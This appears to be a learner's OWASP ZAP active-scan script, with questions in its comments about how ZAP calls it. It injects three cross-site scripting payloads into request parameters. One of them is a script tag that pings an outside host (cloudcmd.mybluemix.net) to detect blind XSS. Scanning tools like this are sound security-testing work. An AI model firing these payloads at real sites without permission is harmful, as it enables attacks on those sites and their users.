var attacks = [
	"\<img src=geoff onerror=confirm\(\'RRRRR_PARAM_INT\'\)\>",
	"\<script\>var xhttp=new XMLHttpRequest();xhttp.open(\"GET\", \"https://cloudcmd.mybluemix.net/pinger.php?geoff=RRRRR_PARAM_INT\", true);xhttp.send();\</script\>",
	"\"\;-->prompt('RRRRR_PARAM_INT')"
]
function scan(as, msg, param, value) {
	for (i = 0; i < attacks.length; i++) {
		new_msg = msg.cloneRequest();
		intRandom = Math.floor((Math.random() * 9999) + 1);
		attack1 = attacks[i].replace("INT",intRandom);
		attack1 = attack1.replace("PARAM",param);
		attack1 = attack1.replace("RRRRR",msg.getRequestHeader().getURI().getEscapedPath().toString());
		print("attack1 = ",attack1);
		as.setParam(new_msg, param, value + attack1);
		as.sendAndReceive(new_msg, false, false);
          
	}
}

// Is the script onliy called once on each request? Can you go back and run it again on a request?
// What is calling the scan func? 
// where are the parameters coming from exactly?
// how is the input devided up into msg, param , value? 

// as, msg, param, value
// as----: org.zaproxy.zap.extension.ascan.ScriptsActiveScanner@c36f		// looks like some sort of JAva object?
// msg----: org.parosproxy.paros.network.HttpMessage@1b3f4106			// looks like some sort of JAva object?
// param----: btnSubmit
// value----: Login
